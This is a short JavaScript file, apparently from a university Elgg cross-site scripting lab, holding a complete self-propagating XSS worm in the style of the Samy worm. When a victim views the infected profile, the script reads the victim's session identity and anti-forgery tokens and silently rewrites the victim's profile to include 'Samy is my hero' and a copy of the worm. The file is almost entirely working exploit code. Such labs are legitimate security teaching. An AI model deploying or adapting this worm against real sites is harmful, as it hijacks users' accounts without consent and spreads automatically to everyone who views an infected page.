/**
* This is the DOM approach
* Copy and paste this code block into the attacker's (Samy) About Me Page.
*/
<script type="text/javascript" id="worm">
window.onload = function() {
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag)
		
	// Set the content of description and access level
	var desc = "&description=Samy is my hero" + wormCode;
	var accesslv = "&accesslevel[description]=2"; 
	desc += accesslv;

	// Get name, guid, timestamp and token
	var name  = "&name=" + elgg.session.user.name;
        var guid  = "&guid=" + elgg.session.user.guid;
        var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;		

	// Set the target url
	var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
        var content = token + ts + name + desc + guid;

	// Construct and send the Ajax Request
	if (elgg.session.user.guid != 47) {
                // create and send ajax request to modify profile
                var Ajax = null;
                Ajax = new XMLHttpRequest();
                Ajax.open("POST", sendurl, true);
                Ajax.setRequestHeader("Host","www.xsslabelgg.com");
                Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                Ajax.send(content);
        }
}
</script>
